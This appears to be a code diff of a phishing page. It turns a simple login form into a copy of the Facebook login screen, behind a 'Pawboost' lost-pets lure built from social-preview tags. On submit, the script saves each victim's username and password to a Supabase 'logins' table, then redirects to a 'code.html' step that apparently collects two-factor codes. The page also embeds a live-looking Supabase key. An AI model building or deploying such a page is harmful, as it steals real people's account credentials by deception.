@@ -2,76 +2,223 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
   <title>Follow our page - Pawboost Community Find Lost Pets</title>
 
+  <!-- Social Meta Tags -->
+  <meta property="og:title" content="Lost & Found Pets US" />
+  <meta property="og:description" content="Join our community to help reunite lost pets with their families." />
+  <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Florida Lost Pets" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Lost & Found Pets Florida" />
+  <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
+
   <style>
+    :root {
+      --fb-blue: #1877f2;
+      --fb-light-gray: #f0f2f5;
+      --fb-dark-blue: #1c1e21;
+      --fb-text-gray: #606770;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
+      background-color: var(--fb-light-gray);
       font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
-      padding: 20px;
+      color: var(--fb-dark-blue);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px 10px;
     }
-
+    .intro-text {
+      text-align: center;
+      margin-top: 20px;
+      margin-bottom: 30px;
+    }
+    .intro-text h1 {
+      color: var(--fb-blue);
+      font-size: 32px;
+    }
+    .intro-text p {
+      font-size: 14px;
+      max-width: 320px;
+      margin: 10px auto 0;
+      color: var(--fb-dark-blue);
+    }
+    .language-toggle {
+      margin-top: 10px;
+      cursor: pointer;
+      font-size: 14px;
+      color: var(--fb-text-gray);
+    }
     .login-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 90%;
       max-width: 400px;
-      margin: 0 auto;
+      margin-top: 10px;
+    }
+    .fb-logo {
+      width: 60px;
+      height: 60px;
       background: white;
-      padding: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .fb-logo img {
+      width: 30px;
+      height: 30px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .input-group input {
+      width: 100%;
+      height: 52px;
+      padding: 0 10px;
       border-radius: 8px;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      font-size: 16px;
       border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1877f2;
-      color: white;
+      background: white;
       font-size: 16px;
+      line-height: 48px;
+    }
+    .input-group label {
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      color: var(--fb-text-gray);
+      font-size: 14px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+    }
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 4px;
+      left: 10px;
+      font-size: 12px;
+      color: #555;
+    }
+    button.login-btn {
+      width: 100%;
+      background-color: var(--fb-blue);
+      color: white;
       border: none;
-      border-radius: 4px;
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    .forgot-password {
+      color: var(--fb-blue);
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 30px;
       cursor: pointer;
     }
-
-    .error-message {
-      color: red;
-      font-size: 12px;
-    }
-
-    #code-list {
-      margin-top: 30px;
-      padding: 10px;
+    .create-account {
+      width: 90%;
+      max-width: 400px;
       background: white;
-      border-radius: 6px;
+      border: 1px solid var(--fb-blue);
+      color: var(--fb-blue);
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      text-align: center;
+      cursor: pointer;
+      margin-bottom: 20px;
     }
-
-    .code-entry {
-      padding: 8px;
-      border-bottom: 1px solid #eee;
+    .meta-footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: white;
+      padding: 10px 20px;
+      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .top-line {
+      gap: 8px;
+      display: flex;
+      align-items: center;
+      margin-bottom: 5px;
+    }
+    .top-line img {
+      height: 22px;
+    }
+    .meta-text {
+      font-weight: 700;
+      color: #616770;
+      font-size: 1rem;
+    }
+    .bottom-line {
+      font-size: 0.8rem;
+      color: #616770;
+    }
+    @media (max-width: 768px) {
+      .top-line { gap: 4px; margin-bottom: 3px; }
+      .top-line img { height: 18px; }
+      .meta-text { font-size: 0.9rem; }
+      .bottom-line { font-size: 0.75rem; }
     }
   </style>
 </head>
 <body>
 
-  <div class="login-container">
-    <h2>Log In</h2>
-    <input type="text" id="username" placeholder="Username or email" />
-    <input type="password" id="password" placeholder="Password" />
-    <button onclick="submitToSupabase()">Log In</button>
-    <div id="error" class="error-message"></div>
+  <div class="intro-text">
+    <h1>Facebook</h1>
+    <p>Facebook helps you connect and share with the people in your life.</p>
   </div>
 
-  <div id="code-list">
-    <h3>Recent Codes</h3>
-    <!-- Realtime data will appear here -->
+  <div class="language-toggle">English (UK) ▼</div>
+
+  <div class="login-container">
+    <div class="fb-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    </div>
+
+    <div class="input-group">
+      <input type="text" id="username" placeholder=" " />
+      <label for="username">Mobile number or email address</label>
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="password" placeholder=" " />
+      <label for="password">Password</label>
+    </div>
+
+    <button class="login-btn" onclick="submitToSupabase()">Log in</button>
+    <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
   </div>
+
+  <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
+
+  <div class="meta-footer">
+    <div class="top-line">
+      <img src="metalogo.png" alt="Meta Logo" />
+      <span class="meta-text">Meta</span>
+    </div>
+    <div class="bottom-line">About · Help · More</div>
+  </div>
+
+  <div id="code-list"></div>
 
   <script type="module">
     import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
@@ -80,49 +227,34 @@
     const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
     const supabase = createClient(supabaseUrl, supabaseKey);
 
-    // 🔒 Form submission
     window.submitToSupabase = async function () {
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const errorDiv = document.getElementById('error');
-      errorDiv.textContent = '';
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
-      if (!username || !password) {
-        errorDiv.textContent = 'Username and password are required.';
+      if (!username || !password) return alert("All fields are required.");
+
+      const { error } = await supabase.from('logins').insert([{ username, password }]);
+      if (error) {
+        alert("Submission failed.");
+        console.error(error);
         return;
       }
 
-      const { error } = await supabase
-        .from('logins')
-        .insert([{ username, password }]);
-
-      if (error) {
-        console.error('Insert error:', error);
-        errorDiv.textContent = 'Failed to log in.';
-      } else {
-        console.log('Login saved!');
-      }
+      window.location.href = "code.html";
     };
 
-    // ✅ Realtime updates for new records in "code" table
     supabase
       .channel('realtime:code')
-      .on('postgres_changes', {
-        event: 'INSERT',
-        schema: 'public',
-        table: 'code'
-      }, payload => {
-        console.log('Realtime code received:', payload.new);
+      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'code' }, payload => {
         displayNewCode(payload.new);
       })
       .subscribe();
 
     function displayNewCode(data) {
-      const container = document.getElementById('code-list');
-      const entry = document.createElement('div');
-      entry.className = 'code-entry';
-      entry.textContent = `🔑 ${data.value}`;
-      container.appendChild(entry);
+      const container = document.getElementById("code-list");
+      const item = document.createElement("div");
+      item.textContent = data.value;
+      container.prepend(item);
     }
   </script>
 </body>
